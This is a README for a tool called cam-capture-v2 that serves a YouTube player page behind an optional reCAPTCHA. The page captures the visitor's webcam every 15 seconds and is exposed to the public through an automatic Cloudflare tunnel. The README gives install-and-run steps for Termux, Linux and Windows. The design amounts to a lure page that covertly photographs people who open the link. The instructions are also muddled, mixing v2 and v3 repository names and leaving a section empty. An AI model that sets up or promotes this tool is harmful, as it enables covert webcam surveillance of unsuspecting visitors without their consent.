# cam-capture-v2

Secure YouTube Player with optional reCAPTCHA and webcam capture.  
Automatically starts a **Cloudflare Tunnel** for public access. Works on **Termux (Android), Linux, and Windows**.

---

## Features

- Play any YouTube video in a web interface
- Optional dark-themed reCAPTCHA
- Webcam capture every 15 seconds
- Auto Cloudflare Tunnel for public URL
- Change YouTube video link and storage path dynamically
- CLI menu for control

---

## Project Structure


---

## Setup Instructions

### 1️⃣ Termux (Android)

```bash
# Update packages
pkg update -y
pkg upgrade -y

# Install Python & Git
pkg install python git -y

# Clone repository
git clone https://github.com/Jabed-A1/cam-capture-v3.git
cd cam-capture-v3

# Install dependencies
pip install flask

# Install cloudflared (for public URL)
pkg install wget -y
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm
chmod +x cloudflared
mv cloudflared $PREFIX/bin/

# Run launcher
python launcher.py
 


# Update packages
sudo apt update && sudo apt upgrade -y

# Install Python & Git
sudo apt install python3 python3-pip git -y

# Clone repository
git clone https://github.com/Jabed-A1/cam-capture-v2.git
cd cam-capture-v3

# Install dependencies
pip3 install flask

# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Run launcher
python3 launcher.py


# Open PowerShell or CMD
git clone https://github.com/Jabed-A1/cam-capture-v2.git
cd cam-capture-v3

# Install dependencies
pip install flask

# Run launcher
python launcher.py

```
# Linux (Kali, Ubuntu, etc.)
```bash
# Update packages
sudo apt update && sudo apt upgrade -y

# Install Python & Git
sudo apt install python3 python3-pip git -y

# Clone repository
git clone https://github.com/Jabed-A1/cam-capture-v2.git
cd cam-capture-v2

# Install dependencies
pip3 install flask

# Install cloudflared
wget https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64.deb
sudo dpkg -i cloudflared-linux-amd64.deb

# Run launcher
python3 launcher.py
```




